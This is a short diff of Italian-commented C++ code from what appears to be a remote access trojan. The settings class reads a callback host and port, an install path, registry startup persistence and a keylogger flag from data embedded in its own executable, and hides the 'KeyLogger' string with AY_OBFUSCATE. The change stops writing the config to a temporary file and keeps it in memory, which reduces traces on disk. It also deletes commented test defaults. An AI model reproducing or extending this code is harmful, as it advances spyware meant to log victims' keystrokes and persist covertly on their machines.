@@ -211,18 +211,14 @@ public:
 	// Costruttore
 	Settaggi()
 	{
-		sf.SetFileName(du.GetModuleFilePath() + "Sett");
-		sf.HideFileContent(sf.Hex);
+		sf.BufferOnly = true;
 	}
 
 	// Popola i settaggi ottenendoli dal relativo file
 	void GetSettingsFromExe()
 	{
-		string FileName = du.GetModuleFilePath() + "Sett";
 		string BinaryFileContent = du.GetBinaryFileContent(du.GetFullModuleFilePath());
-		string FileContent = SimpleFind(BinaryFileContent, en.AsciiToHex("{START}"), en.AsciiToHex("{END}"));
-
-		du.WriteFile(FileName, FileContent);
+		sf.Buff = en.HexToAscii(SimpleFind(BinaryFileContent, en.AsciiToHex("{START}"), en.AsciiToHex("{END}")));
 
 		Host = sf.GetSetting("Host");
 		Porta = stoi(sf.GetSetting("Port"));
@@ -230,15 +226,6 @@ public:
 		ExeName = sf.GetSetting("ExeName");
 		RegStartup = (sf.GetSetting("RegStartup") == "true");
 		KeyLogger = (sf.GetSetting((string)AY_OBFUSCATE("KeyLogger")) == "true");
-
-		/*Host = "127.0.0.1";
-		Porta = 6969;
-		InstallPath = "C:\\Users\\<User>\\AppData\\Local\\Temp";
-		ExeName = "Boiade.exe";
-		RegStartup = true;
-		KeyLogger = false;*/
-
-		du.DelFile(du.GetModuleFilePath() + "Sett");
 	}
 
 	// Popola i settaggi ottenendoli dal registro
